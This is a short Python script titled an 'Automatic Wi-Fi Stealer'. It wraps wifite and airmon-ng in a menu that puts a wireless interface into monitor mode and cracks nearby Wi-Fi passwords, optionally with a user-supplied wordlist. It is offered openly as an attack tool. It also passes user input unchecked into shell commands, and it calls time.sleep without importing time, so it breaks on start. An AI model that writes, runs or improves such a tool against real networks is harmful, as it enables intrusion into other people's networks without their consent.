import os

print("Automatic Wİ-Fİ Stealer (works with wifite)")
time.sleep(1)
print("coded by root@ebby")

print("""
1. Start
2. Interface
3. Monitor Mode
4. Managed Mode
5. Network Service options
6. All Options
        """)
while True:

    lol = int(input("Option : "))
    
    if lol == 1:
        
        while True:
            
            interface = input("Interface name : ")
            print("Are you want to use your own wordlist ?")
            cevap = input("YES - NO - EXIT: ")
            if cevap == "YES" or cevap == "yes":
                wlist = input("wordlist : ")
                os.system("apt install wifite")
                os.system("wifite -i {} --dict {}".format(interface,wlist))
            elif cevap == "NO" or cevap == "no":
                os.system("apt install wifite")
                os.system("wifite -i {}".format(interface))
                
            elif cevap == "EXIT" or cevap == "exit":
                break
            else:
                print("Type YES - NO - EXIT ! ")
                    
        
    elif lol == 2:
        os.system("ifconfig")
    elif lol == 3:
        interface = input("Interface name : ")
        os.system("airmon-ng start {}".format(interface))
    elif lol == 4:
        interface = input("Interface name : ")
        os.system("airmon-ng stop {}".format(interface))        
    elif lol == 5:
        print("""
1. Start
2. Stop
3. Restart              
              """)
        myley = int(input("Option : "))
        if myley == 1:
            os.system("service network-manager start")
        elif myley == 2:
            os.system("service network-manager stop")
        elif myley == 3:
            os.system("service network-manager restart")
        else:
            print("Select Printed Options")    
    
    elif lol == 6:
        print("""
1. Start
2. Interface
3. Monitor Mode
4. Managed Mode
5. Network Service options
        """)
            
    else:
        print("Select Printed Options")
